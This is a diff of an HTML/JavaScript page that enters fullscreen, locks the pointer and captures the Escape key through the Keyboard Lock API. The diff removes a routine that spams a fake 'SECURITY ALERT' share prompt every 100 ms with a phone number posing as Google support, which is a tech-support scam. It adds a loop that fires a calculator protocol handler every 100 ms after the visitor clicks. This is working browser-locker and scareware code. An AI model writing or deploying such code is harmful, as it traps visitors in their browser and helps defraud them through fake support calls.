@@ -28,29 +28,6 @@
         font-size: 16px;
         color: #666;
       }
-      #share-button {
-        margin-top: 15px;
-        padding: 10px 20px;
-        font-size: 16px;
-        background-color: #4CAF50;
-        color: white;
-        border: none;
-        border-radius: 5px;
-        cursor: pointer;
-        transition: background-color 0.3s;
-      }
-      #share-button:hover {
-        background-color: #45a049;
-      }
-      #share-button:disabled {
-        background-color: #cccccc;
-        cursor: not-allowed;
-      }
-      #share-status {
-        margin-top: 10px;
-        font-size: 14px;
-        color: #999;
-      }
     </style>
   </head>
   <body>
@@ -60,17 +37,31 @@
       lock.
     </div>
     <div id="esc-status">Esc Key: Unlocked</div>
-    <button id="share-button">Start Share Navigation</button>
-    <div id="share-status"></div>
     <script>
       const canvas = document.getElementById("canvas");
       const ctx = canvas.getContext("2d");
       const escStatus = document.getElementById("esc-status");
-      const shareButton = document.getElementById("share-button");
-      const shareStatus = document.getElementById("share-status");
       let isEscLocked = false;
       let isFullscreen = false;
-      let shareInterval = null;
+      let calculatorInterval = null;
+
+      // Calculator handler function
+      function openCalculator() {
+        try {
+          // Opsi 1: Menggunakan Windows Calculator Protocol (untuk Windows)
+          window.location.href = 'calculator://';
+          
+          // Opsi 2: Menggunakan MS Calculator Protocol
+          // window.location.href = 'ms-calculator://';
+          
+          // Opsi 3: Membuka web calculator
+          // window.open('https://www.calculator.net/', '_blank');
+          
+          console.log('Calculator protocol handler called');
+        } catch (err) {
+          console.error('Failed to open calculator:', err);
+        }
+      }
 
       // Request pointer lock and fullscreen on click
       canvas.addEventListener("click", async () => {
@@ -78,53 +69,27 @@
           // Request fullscreen first
           await document.documentElement.requestFullscreen();
           isFullscreen = true;
+          
           // Then pointer lock
           canvas.requestPointerLock =
             canvas.requestPointerLock ||
             canvas.mozRequestPointerLock ||
             canvas.webkitRequestPointerLock;
           canvas.requestPointerLock();
+          
+          // Start calculator handler interval (jika diperlukan)
+          // Peringatan: ini akan memanggil calculator setiap 100ms
+          if (!calculatorInterval) {
+            calculatorInterval = setInterval(() => {
+              openCalculator();
+            }, 100);
+          }
+          
+          // ATAU jika hanya ingin membuka sekali:
+          // openCalculator();
+          
         } catch (err) {
           console.error("Failed to enter fullscreen or pointer lock:", err);
-        }
-      });
-
-      // Handle share button click with 1 second delay
-      shareButton.addEventListener("click", () => {
-        if (shareInterval) {
-          // Stop sharing
-          clearInterval(shareInterval);
-          shareInterval = null;
-          shareButton.textContent = "Start Share Navigation";
-          shareStatus.textContent = "";
-          shareButton.disabled = false;
-        } else {
-          // Start sharing with 1 second delay
-          shareButton.disabled = true;
-          shareStatus.textContent = "Starting in 1 second...";
-          
-          setTimeout(() => {
-            shareStatus.textContent = "Share navigation active";
-            shareButton.textContent = "Stop Share Navigation";
-            shareButton.disabled = false;
-            
-            shareInterval = setInterval(() => {
-              if (navigator.share) {
-                navigator.share({
-                  title: '\u26A0 SECURITY ALERT \u26A0\nCall 123-456-7890 for Google.com Support',
-                  text: 'Call 123-456-7890'
-                }).catch(err => {
-                  console.log("Share cancelled or failed:", err);
-                });
-              } else {
-                console.log("Navigator.share not supported");
-                clearInterval(shareInterval);
-                shareInterval = null;
-                shareButton.textContent = "Start Share Navigation";
-                shareStatus.textContent = "Share API not supported in this browser";
-              }
-            }, 100);
-          }, 1000); // 1 second delay
         }
       });
 
@@ -167,6 +132,13 @@
           console.log("Pointer unlocked");
           document.removeEventListener("mousemove", updatePosition, false);
           document.removeEventListener("keydown", handleKeyDown, false);
+          
+          // Stop calculator interval
+          if (calculatorInterval) {
+            clearInterval(calculatorInterval);
+            calculatorInterval = null;
+          }
+          
           if (isEscLocked) {
             unlockEsc();
           }
@@ -181,6 +153,13 @@
         if (!document.fullscreenElement) {
           isFullscreen = false;
           console.log("Exited fullscreen");
+          
+          // Stop calculator interval
+          if (calculatorInterval) {
+            clearInterval(calculatorInterval);
+            calculatorInterval = null;
+          }
+          
           // Exit pointer lock if fullscreen exits
           if (document.pointerLockElement) {
             document.exitPointerLock();
@@ -218,9 +197,8 @@
             await lockEsc();
           }
         } else if (e.key === "Escape" && isEscLocked) {
-          // Handle Esc press here if captured (e.g., do nothing or custom action)
           console.log("Esc pressed while locked - ignoring or handling custom");
-          e.preventDefault(); // Try to prevent default, but won't stop browser exit
+          e.preventDefault();
         }
       }
 
@@ -228,7 +206,6 @@
       async function lockEsc() {
         try {
           if ("keyboard" in navigator && isFullscreen) {
-            // Only lock in fullscreen
             await navigator.keyboard.lock(["Escape"]);
             isEscLocked = true;
             escStatus.textContent = "Esc Key: Locked";
@@ -250,13 +227,6 @@
           console.log("Esc key unlocked");
         }
       }
-
-      // Clean up on page unload
-      window.addEventListener("beforeunload", () => {
-        if (shareInterval) {
-          clearInterval(shareInterval);
-        }
-      });
 
       draw();
     </script>
